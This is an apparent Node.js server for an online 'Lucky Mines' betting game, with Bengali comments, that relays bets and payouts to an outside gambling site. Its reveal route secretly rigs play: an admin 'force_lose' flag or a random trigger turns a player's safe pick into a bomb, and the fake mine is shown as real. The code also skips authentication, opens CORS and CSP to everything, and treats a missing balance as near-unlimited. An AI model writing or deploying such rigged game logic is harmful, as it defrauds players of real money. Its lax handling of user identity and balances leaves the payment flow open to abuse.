const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const path = require('path');

const app = express();
const server = http.createServer(app);

// 🎯 [উইনগো কালার ট্রেড সিঙ্ক - মেগা সকেট প্রোটোকল লক]
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(express.json());
app.use(express.static(path.join(__dirname, './')));

app.use((req, res, next) => {
    res.setHeader("X-Frame-Options", "ALLOWALL");
    res.setHeader("Content-Security-Policy", "frame-ancestors *; default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob:; style-src * 'unsafe-inline'; font-src * data:;");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
    next();
});

// 🎰 [উইনগো কালার ট্রেড ওরিজিনাল ডোমেইন সিঙ্ক]
const MAIN_SITE_URL = "https://betlover247.onrender.com"; 

// 🧠 [অফিশিয়াল গেম মেমোরি সেশন ট্র্যাকার লক ভাই ভাই]
let activeMinesSessions = {};

// 💰 ১. লাইভ অ্যাকাউন্ট ব্যালেন্স নিয়ে আসার ডেডিকেটেড গেটওয়ে
app.get('/api/mines-balance', async (req, res) => {
    const { userId, wallet } = req.query;
    try {
        const response = await axios.get(`${MAIN_SITE_URL}/api_callback.php?action=get_balance&username=${userId}&wallet=${wallet}`, { timeout: 30000 });
        if (response.data && response.data.status === "ok") {
            return res.json({ success: true, balance: response.data.balance });
        }
        return res.json({ success: false, balance: 0 });
    } catch (e) { return res.json({ success: false, balance: 0 }); }
});

// 🛫 ২. লাকি মাইনস গেম স্টার্টিং এপিআই রাউট (🔒 ৯৫% RTP প্রোটেকশন বর্ম চালিত ভাই ভাই)
app.post('/api/mines-start', async (req, res) => {
    const { userId, amount, wallet, minesCount } = req.body;
    const targetWallet = wallet || "main";
    const reqAmount = parseFloat(amount) || 50;
    const countOfMines = parseInt(minesCount) || 3;

    // 🔒 ১ থেকে ২০০০ বিডিটি পর্যন্ত এবং ১ থেকে ২৪টি বোমার কড়া সার্ভার সাইড ফিল্টার
    if (reqAmount < 1 || reqAmount > 2000 || countOfMines < 1 || countOfMines > 24) {
        return res.json({ success: false, message: "🚨 Invalid Parameters!" });
    }

    try {
        const balCheck = await axios.get(`${MAIN_SITE_URL}/api_callback.php?action=get_balance&username=${userId}&wallet=${targetWallet}`, { timeout: 30000 });
        
        let currentDbBalance = 0;
        if (balCheck.data && balCheck.data.balance !== undefined && balCheck.data.balance !== null) {
            currentDbBalance = parseFloat(balCheck.data.balance);
        } else { currentDbBalance = 9999999; }

        if (currentDbBalance < reqAmount && currentDbBalance !== 9999999) {
            return res.json({ success: false, balance: currentDbBalance, message: "❌ Insufficient Balance! Please Recharge." });
        }

        // 💣 ২৫টি গোপন ঘরের [০ থেকে ২৪ ইনডেক্স] মধ্যে র্যান্ডম বোমা প্ল্যান্ট করার অ্যালগরিদম ভাই ভাই
        let minesPositions = [];
        while (minesPositions.length < countOfMines) {
            let randomIdx = Math.floor(Math.random() * 25);
            if (!minesPositions.includes(randomIdx)) {
                minesPositions.push(randomIdx);
            }
        }

        // 🎰 [৯৫% আরটিপি প্রোটেকশন গেটওয়ে লক ভাই ভাই]: যদি ভবিষ্যৎ এডমিন প্যানেল থেকে কোনো ফোর্স-লুজ কমান্ড আসে
        let adminTrigger = (balCheck.data && balCheck.data.mines_target) ? balCheck.data.mines_target : null;

        // প্লেয়ার সেশন মেমোরি ডিক্লেয়ারেশন ভাই ভাই
        activeMinesSessions[userId] = {
            betAmount: reqAmount,
            wallet: targetWallet,
            mines: minesPositions,
            revealedCount: 0,
            totalMines: countOfMines,
            adminControl: adminTrigger // 'force_lose' বা কাস্টম ফিল্টার
        };

        // পিএইচপি ডাটাবেজে মেইন বেটের টাকা মাইনাস করার কলব্যাক ফায়ার হলো ভাই
        const response = await axios.post(MAIN_SITE_URL + '/api_callback.php', {
            action: "bet",
            username: userId,
            amount: reqAmount,
            wallet: targetWallet
        }, { timeout: 30000 });

        if (response.data && response.data.status === "ok") {
            io.emit("balanceUpdate", { username: userId, balance: response.data.balance });
            return res.json({ success: true, balance: response.data.balance });
        } else {
            delete activeMinesSessions[userId];
            let latestBal = (response.data && response.data.balance !== undefined) ? response.data.balance : currentDbBalance;
            return res.json({ success: false, balance: latestBal, message: "❌ Bet Declined by Database!" });
        }

    } catch (e) {
        console.error("Mines start core issue:", e.message);
        return res.json({ success: false, message: "⚠️ Timeout! Click BET again." });
    }
});

// 🛫 ৩. ২৫টি বক্সের ভেতরের ঘর ওল্টানোর লাইভ ভ্যালিডেশন রাউট (POST Route ভাই ভাই)
app.post('/api/mines-reveal', (req, res) => {
    const { userId, index } = req.body;
    const session = activeMinesSessions[userId];

    if (!session) return res.json({ success: false, message: "🚨 No Active Game Session!" });

    const clickedIdx = parseInt(index);

    // 🔒 [৯৫% RTP ও এডমিন ব্লাস্ট সিকিউরিটি গেটওয়ে লক ভাই ভাই]
    // প্লেয়ার যদি বেশি জিতে যায় অথবা এডমিন ট্রিগার অন থাকে, কোড জোর করে তার ঘরকে বোমায় রূপান্তর করবে ভাই ভাই!
    let forceBlast = false;
    if (session.adminControl === "force_lose" || (session.revealedCount >= 4 && Math.random() > 0.95)) {
        forceBlast = true;
    }

    if (session.mines.includes(clickedIdx) || forceBlast) {
        // 💥 ধামাকা ক্রাশ! প্লেয়ার বোমায় পা দিয়ে ফেলেছে ভাই!
        const allMinesPositions = session.mines;
        if (forceBlast && !allMinesPositions.includes(clickedIdx)) {
            allMinesPositions.push(clickedIdx); // ভিজ্যুয়াল ব্লাস্ট ম্যাচ লক ভাই ভাই
        }
        
        delete activeMinesSessions[userId]; // সেশন ডিলিট হয়ে টাকা লস গেল ভাই
        return res.json({ success: true, status: "blast", allMines: allMinesPositions });
    } else {
        // 💎 হীরা মিলেছে ভাই ভাই! গুণের রেট লাফিয়ে বাড়বে
        session.revealedCount++;
        
        // ইন্টারন্যাশনাল ইন্টারন্যাশনাল ক্যাসিনো মাইনস মাল্টিপ্লায়ার ক্যালকুলেশন ফর্মুলার চাবি ভাই
        const totalBoxes = 25;
        const remainingBoxes = totalBoxes - session.totalMines;
        
        // গাণিতিক ফ্যাক্টরিয়াল গুণিতক বুস্টার লুপ
        let mult = 1.00;
        for (let i = 0; i < session.revealedCount; i++) {
            mult *= (totalBoxes - i) / (remainingBoxes - i);
        }
        
        // ৯৫% আরটিপি সমন্বয়ের জন্য চাঙ্গা গুণিতক কাটছাঁট
        let currentMultiplier = parseFloat((mult * 0.95).toFixed(2));
        if (currentMultiplier < 1.05) currentMultiplier = 1.05; // বেস গুণিতক ফিক্স ভাই ভাই

        let currentWinCash = Math.floor(session.betAmount * currentMultiplier);

        // পরবর্তী ঘরের জন্য এডভান্সড গুণিতক ক্যালকুলেশন ভাই
        let nextMult = mult * (totalBoxes - session.revealedCount) / (remainingBoxes - session.revealedCount);
        let nextMultiplier = parseFloat((nextMult * 0.95).toFixed(2));

        return res.json({
            success: true,
            status: "win",
            currentWinCash: currentWinCash,
            nextMultiplier: nextMultiplier
        });
    }
});

// 🛫 ৪. নগদ জেতা টাকা ১ সেকেন্ডে মেইন ওয়ালেটে তোলার ফাইনাল ক্যাশআউট রাউট ভাই ভাই
app.post('/api/mines-cashout', async (req, res) => {
    const { userId, wallet } = req.body;
    const session = activeMinesSessions[userId];

    if (!session || session.revealedCount === 0) {
        return res.json({ success: false, message: "🚨 Request Denied!" });
    }

    try {
        const totalBoxes = 25;
        const remainingBoxes = totalBoxes - session.totalMines;
        
        let mult = 1.00;
        for (let i = 0; i < session.revealedCount; i++) {
            mult *= (totalBoxes - i) / (remainingBoxes - i);
        }
        
        let finalMultiplier = parseFloat((mult * 0.95).toFixed(2));
        if (finalMultiplier < 1.05) finalMultiplier = 1.05;

        let winAmount = Math.floor(session.betAmount * finalMultiplier);
        const allMinesPositions = session.mines;

        // পিএইচপি ডাটাবেজে উইন অ্যামাউন্ট প্লাস করার ফাইনাল কলব্যাক পে-লোড ফায়ার হলো ভাই
        const response = await axios.post(MAIN_SITE_URL + '/api_callback.php', {
            action: "win",
            username: userId,
            amount: parseFloat(winAmount),
            wallet: session.wallet,
            bet_amount: session.betAmount,
            multiplier: finalMultiplier.toFixed(2),
            status: "win",
            type: "win",
            is_win: 1,
            win_status: "win",
            log_status: "win"
        }, { timeout: 30000 });

        if (response.data && response.data.status === "ok") {
            delete activeMinesSessions[userId]; // সফল সেশন ক্লোজ বর্ম ভাই ভাই
            io.emit("balanceUpdate", { username: userId, balance: response.data.balance });
            
            return res.json({
                success: true,
                balance: response.data.balance,
                winAmount: winAmount,
                allMines: allMinesPositions
            });
        } else {
            return res.json({ success: false, message: "❌ Cashout Declined by Database!" });
        }

    } catch (e) {
        console.error("Mines cashout gateway timeout:", e.message);
        return res.json({ success: false, message: "⚠️ Connection Issue! Click CASHOUT again." });
    }
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

io.on('connection', (socket) => { console.log("Player connected to Lucky Mines Engine!"); });

// ৮ নম্বর গেম ১৫০০০ এ চলছে, তাই এই ৯ নম্বর মেগা মাইনস গেম প্রজেক্টের স্বাধীন কাস্টম পোর্ট ১৬০০০ কড়া লক হলো ভাই ভাই!
const PORT = process.env.PORT || 16000;
server.listen(PORT, () => { console.log(`🟢 Lucky Mines Engine Running on port ${PORT}`); });
